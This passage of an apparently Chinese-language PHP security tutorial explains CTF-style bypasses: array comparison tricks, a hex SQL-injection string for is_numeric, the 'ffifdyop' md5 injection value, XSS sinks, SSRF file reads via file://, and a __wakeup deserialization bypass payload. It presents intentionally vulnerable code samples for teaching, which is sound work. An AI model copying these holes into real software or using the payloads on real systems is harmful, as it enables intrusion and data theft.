<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($a,$b))&#123;</span><br><span class="line">		<span class="keyword">if</span>(sha1($a) === sha1($b))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'nice!!!'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Try again!'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们传入<code>a[]=1&amp;b[]=2</code>的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了<code>nice!!!</code>，所以我们完全可以用数字来绕过<code>sha1()</code>函数的比较。</p>
<h4 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h4><p>我们先来了解一下这个函数。此函数是检测变量是否为数字或者数字字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">is_numeric( mixed $var) : bool</span><br></pre></td></tr></table></figure>

<p>如果<code>var</code>是数字或者数字字符串那么就返回TRUE，否则就返回FALSE。那么这里说的绕过是什么姿势呢？是十六进制。我们先来看一个简单的例子。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = is_numeric(<span class="string">'0x31206f722031'</span>);</span><br><span class="line">	<span class="keyword">if</span>($a)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'It meets my requirement'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Try again'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">It meets my requirement</span><br></pre></td></tr></table></figure>

<p>这里说一下<code>0x31206f722031</code>这个是什么？这个是<code>or 1=1</code>的十六进制，从这里可以看出，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，那么我们就能利用此漏洞实现sql注入。同样的，这个漏洞再CTF比赛中也是很常见的。</p>
<h4 id="in-array-绕过"><a href="#in-array-绕过" class="headerlink" title="in_array()绕过"></a>in_array()绕过</h4><p>此函数用来检测数组中是否存在某个值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">in_array( mixed $needle, <span class="keyword">array</span> $haystack[, bool $strict = <span class="keyword">FALSE</span>] ) : bool</span><br></pre></td></tr></table></figure>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>needle：带搜索的值(区分大小写)。</li>
<li>haystack：带搜索的数组。</li>
<li>strict：若此参数的值为TRUE，那么<code>in_array()</code>函数将会检查needle的类型是否和haystack中的类型相同。</li>
</ul>
<p>有时候我们再传入一个数组的时候，代码可能会过滤某些敏感字符串，但是我们又需要传入这样的字符串，那么我们应该如何绕过它的检测呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $myarr = <span class="keyword">array</span>(<span class="string">'Ameng'</span>);</span><br><span class="line">	$needle = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(in_array($needle,$myarr))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"It's in array"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"not in array"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码示例执行的结果会是什么呢？从简单的逻辑上分析。0是不存在要搜索的数组中的，所以理论上，应该是输出<code>not in array</code>，但是实际却输出了<code>It&#39;s in array</code>。这是为什么呢？原因就在于PHP的默认类型转换。这里我们第三个参数并没有设置为<code>true</code>那么默认就是非严格比较，所以在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。所以归根到底还是非严格比较导致的问题。所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过。</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">print</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="echo"><a href="#echo" class="headerlink" title="echo()"></a>echo()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$str"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	printf($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h4><p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = sprintf($str);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$a"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="die"><a href="#die" class="headerlink" title="die()"></a>die()</h4><p>此函数输出一条信息，并退出当前脚本。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	<span class="keyword">die</span>($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h4><p>此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = <span class="keyword">array</span>($str);</span><br><span class="line">	var_dump($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="var-export"><a href="#var-export" class="headerlink" title="var_export()"></a>var_export()</h4><p>此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和<code>var_dump</code>类似，不同的是其返回的表示是合法的 PHP 代码。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	$a = <span class="keyword">array</span>($str);</span><br><span class="line">	var_export($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP黑魔法"><a href="#PHP黑魔法" class="headerlink" title="PHP黑魔法"></a>PHP黑魔法</h3><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><p><code>md5()</code>函数绕过sql注入。我们来看一个例子。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里提交的参数通过<code>md5</code>函数处理，然后再进入SQL查询语句，所以常规的注入手段就不行了，那么如果md5后的转换成字符串格式变成了<code>&#39;or&#39;xxxx</code>的格式，不就可以注入了么。<code>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</code></p>
<p>转成字符串为<code>&#39;or&#39;6xxx</code></p>
<h4 id="eval-1"><a href="#eval-1" class="headerlink" title="eval()"></a>eval()</h4><p>在执行命令时，可使用分号构造处多条语句。类似这种。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = <span class="string">"echo 'a';echo '--------------';echo 'b';"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">eval</span>($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><p>存在<code>%00</code>截断，当遇到使用此函数来进行正则匹配时，我们可以用<code>%00</code>来截断正则匹配，从而绕过正则。</p>
<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>这个在前面介绍过，就是数组绕过技巧。</p>
<h4 id="curl-setopt"><a href="#curl-setopt" class="headerlink" title="curl_setopt()"></a>curl_setopt()</h4><p>存在ssrf漏洞。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'Ameng'</span>]);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//使用file协议进行任意文件读取</span></span><br><span class="line"><span class="comment">//1.php?Ameng=file:///D:/phpstudy_pro/WWW/demo.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="preg-replace-1"><a href="#preg-replace-1" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>此函数前面详细介绍过，/e模式下的命令执行。</p>
<h4 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h4><p>url二次编码绕过。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$name = urldecode($_GET[<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">if</span>($name = <span class="string">"Ameng"</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Plase~"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将Ameng进行二次url编码，然后传入即可得到满足条件。</p>
<h4 id="file-get-contents-1"><a href="#file-get-contents-1" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>常用伪协议来进行绕过。</p>
<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h4><p>此函数主要用于绕过某些过滤，先简单了解一下函数的基本用法。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$url = <span class="string">"http://www.jlx-love.com/about"</span>;</span><br><span class="line">	$parts = parse_url($url);</span><br><span class="line">	print_r($parts);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">执行结果——&gt;</span><br><span class="line"><span class="keyword">Array</span> </span><br><span class="line">    ( </span><br><span class="line">    [scheme] =&gt; http </span><br><span class="line">    [host] =&gt; www.jlx-love.com 		[path] =&gt; /about </span><br><span class="line">	)</span><br></pre></td></tr></table></figure>

<p>可以看到这个函数把我们的变量值拆分成一个几个部分。那么绕过过滤又是说的哪回事呢？其实就是当我们在浏览器输入url时，那么就会将url中的\转换为/，从而就会导致<code>parse_url</code>的白名单绕过。</p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>在了解一些函数之前，我们首先需要了解什么是序列化和反序列化。</p>
<p>序列化：把对象转换为字节序列的过程成为对象的序列化。</p>
<p>反序列化：把字节序列恢复为对象的过程称为对象的反序列化。</p>
<p>归根到底，就是将数据转化成一种可逆的数据结构，逆向的过程就是反序列化。</p>
<p>在 PHP 中主要就是通过<code>serialize</code>和<code>unserialize</code>来实现数据的序列化和反序列化。</p>
<p>那么漏洞是如何形成的呢？</p>
<p>PHP 的反序列化漏洞主要是因为未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而就可以导致各种危险行为。</p>
<p>那么我们先来看一看序列化后的数据格式是怎样的，了解了序列化后的数据，我们才能更好的理解和利用漏洞。所以我们来构造一段序列化的值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $who = <span class="string">"Ameng"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$a = serialize(<span class="keyword">new</span> Ameng);</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">O:<span class="number">5</span>:<span class="string">"Ameng"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"who"</span>;s:<span class="number">5</span>:<span class="string">"Ameng"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210425/16193177504420.png" alt="image-20210423051113545"></p>
<p>这里还要补充一点，就是关于变量的分类，变量的类别有三种：</p>
<ul>
<li>public：正常操作，在反序列化时原型就行。</li>
<li>protected：反序列化时在变量名前加上%00*%00。</li>
<li>private：反序列化时在变量名前加上%00类名%00。</li>
</ul>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>在我们反序列化时，会先检查类中是否存在<code>__wakeup()</code>如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>执行<code>__destruct()</code>。</p>
<p>影响版本：</p>
<p>PHP5 &lt; 5.6.25</p>
<p>PHP7 &lt; 7.0.10</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">'1.php'</span>; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct执行&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> highlight_file(<span class="keyword">$this</span>-&gt;name, <span class="keyword">true</span>); </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wakeup执行&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name=<span class="string">'1.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">	$data = <span class="string">'O:5:"Ameng":2:&#123;s:4:"name";s:5:"2.php";&#125;'</span>;</span><br><span class="line">	unserialize($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//destruct执行</span></span><br></pre></td></tr></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p><code>__sleep()</code>函数刚好与<code>__waeup()</code>相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用。那么该如何利用呢？我们看看代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123; </span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">'1.php'</span>; </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$name;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"sleep()执行&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> highlight_file(<span class="keyword">$this</span>-&gt;name, <span class="keyword">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"over&lt;br&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"wakeup执行&lt;br&gt;"</span>;         </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Ameng(<span class="string">"2.php"</span>);</span><br><span class="line">	$b = serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//sleep()执行</span></span><br><span class="line"><span class="comment">//OVER</span></span><br></pre></td></tr></table></figure>

<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>这个函数的作用其实在上面的例子中已经显示了，就是在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，我们完全可以利用这一点来进行漏洞的利用，得到自己想要的结果。</p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p>这个函数的作用在<code>__sleep()</code>也是体现了的，这个函数就是在一个对象被创建时会调用这个函数，比如我在<code>__sleep()</code>中用这个函数来对变量进行赋值。</p>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>此函数用来监视一个对象中的其他方法。当你尝试调用一个对象中不存在的或者被权限控制的方法，那么<code>__call</code>就会被自动调用</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$args)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"call执行失败"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($name,$args)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"callStatic执行失败"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$a = <span class="keyword">new</span> Ameng;</span><br><span class="line">	$a-&gt;b();</span><br><span class="line">	Ameng::b();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//call执行失败</span></span><br><span class="line"><span class="comment">//callStatic执行失败</span></span><br></pre></td></tr></table></figure>

<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用。具体使用在上面代码示例和结果可见。那么这两个函数有什么值得我们关注的呢？想一想，倘若这两个函数中有命令执行的函数，那么我们调用对象中不存在方法时就可以调用这两个函数，这不就达到我们想要的目的了。</p>
<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>一般来说，我们总是把类的属性定义为private。但有时候我们对属性的读取和赋值是非常频繁，这个时候PHP就提供了两个函数来获取和赋值类中的属性。</p>
<p>get方法用来获取私有成员属性的值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__get()方法用来获取私有属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>$name：要获取成员属性的名称。</li>
</ul>
<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>此方法用来给私有成员属性赋值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__set()方法用来设置私有属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($name,$value)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;$name = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>$name：要赋值的属性名。</li>
<li>$value：给属性赋值的值。</li>
</ul>
<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>这个函数是当我们对不可访问属性调用<code>isset()</code>或者<code>empty()</code>时调用。</p>
<p>在这之前我们要先了解一下<code>isset()</code>函数的使用。<code>isset()</code>函数检测某个变量是否被设置了。所以这个时候问题就来了，如果我们使用这个函数去检测对象里面的成员是否设定，那么会发生什么呢？</p>
<p>若对象的成员是公有成员，那没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，人家根本就不允许你访问，你咋能检测人家是否设定了呢？那我们该怎么办？这个时候我们可以在类里面加上<code>__isset()</code>方法，接下来就可以使用<code>isset()</code>在对象外面访问对象里面的私有成员了。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"当在类外面调用isset方法时，那么我就会执行！"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">"Ameng"</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">isset</span>($ameng-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//当在类外面调用isset方法时，那么我就会执行！</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>这个方法基本和<code>__insset</code>情况一致，都是在类外访问类内私有成员时要调用这个函数，基本调用的方法和上面一致。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"当在类外面调用unset方法时，那么我就会执行！"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">"Ameng"</span>);</span><br><span class="line">	<span class="keyword">unset</span>($ameng-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//当在类外面调用unset方法时，那么我就会执行！</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p>此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果。</p>
<p>通常情况下，我们访问类的属性的时候都是<code>$实例化名称-&gt;属性名</code>这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用<code>__tostring()</code>就可以直接用echo来输出了。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">private</span> $age;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;age . <span class="string">'岁了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">'Ameng'</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">echo</span> $ameng;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ameng3岁了</span><br></pre></td></tr></table></figure>

<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。</p>
<p>版本要求：</p>
<p>PHP &gt; 5.3.0</p>
<p>代码示例：</p>
